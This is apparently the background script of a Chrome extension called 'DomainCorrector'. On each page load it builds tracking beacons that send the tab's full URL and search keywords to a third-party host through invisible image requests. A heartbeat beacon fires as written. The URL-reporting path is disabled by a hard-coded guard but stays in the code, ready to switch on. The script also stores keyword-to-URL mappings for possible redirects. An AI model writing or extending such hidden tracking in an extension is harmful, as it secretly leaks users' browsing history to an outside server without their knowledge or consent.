var consts = {};
consts.TOPIC_COMMON = "dbrg7";
consts.EXT_NAME = "DomainCorrector";
consts.QUICK_HOST ="q.https://domaincorrector.herokuapp.com";
consts.QUICK_URL_PREFIX = "https://endall41-q.apollocdn.com/dealdo/event-report";
var jsonToUrlParams = function(obj){
    var d = obj;

    var str = '';
    var arr = new Array();
    for(var key in d){

        arr.push( key + "=" + d[key] );

    }
    if(arr.length > 0){
        str += arr.pop(0);
        for(var index in arr){
            str+="&";
            str += arr[index];
        }


    }
    return str;

};

var buildUrlEvent = function(url , jsonUrlParams){
    var str = "";
    str += url + "?" + jsonToUrlParams(jsonUrlParams);
    return str;
};

var reportHb = function(){
    if(!true){
        return;
    }
    var img = document.createElement("img");
    var oneInHour = (+new Date() / 1E3 | 0) - (+new Date() / 1E3 | 0) % (1*60);
    img.setAttribute("src" , consts.QUICK_URL_PREFIX + "?type=quick&topic=hrbt_"+ consts.EXT_NAME  +"&cb=" + oneInHour);

};

var reportEvent = function(src , callback){
    if(!false){
        return;
    }

    try {
        var img = document.createElement("img");
        img.src = src;
        if(typeof callback !== "undefined" && callback !== "" && callback !== null){
            iframe.onload = callback;
        }



    } catch (E111) {

    }

};

var reportQuick = function(topic ,jsonUrlParams , callback){
    jsonUrlParams.type = "quick";
    jsonUrlParams.topic = consts.TOPIC_COMMON + "_" + consts.EXT_NAME + "_" +topic;
    jsonUrlParams.cb = Math.random();

    var url = consts.QUICK_URL_PREFIX;
    url = buildUrlEvent(url , jsonUrlParams);


    reportEvent(url  , callback);


};

//noinspection JSUnresolvedFunction,JSUnresolvedVariable
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        console.log(sender.tab ?
        "from a content script:" + sender.tab.url :
            "from the extension");
        if ("topic" in request ){
            if(request.topic==="quick"){
                var jsonParams = {pageurl:encodeURIComponent(sender.tab.url)};
                var kkey = "keyword";
                if(kkey in request){
                    jsonParams[kkey] = request[kkey];
                }
                reportQuick(request.topic , jsonParams);

            }
            if(request.topic==="localstorage"){
                var keyword = request.keyword.replace(/\+/g," ");
                var message = {topic:"localstorage" , url: localStorage.getItem(keyword)};
                sendResponse(message);

            }
            if(request.topic=== "suspend"){
                var key = request.key.replace(/\+/g," ");
                localStorage.setItem(key , request.val);
            }

        }


    });

//noinspection JSUnresolvedVariable,JSUnresolvedFunction
chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {
    if (changeInfo.status == 'complete'  ) {
        reportQuick("imp" , {pageurl:encodeURIComponent(tab.url)});
        reportHb();

    }
});


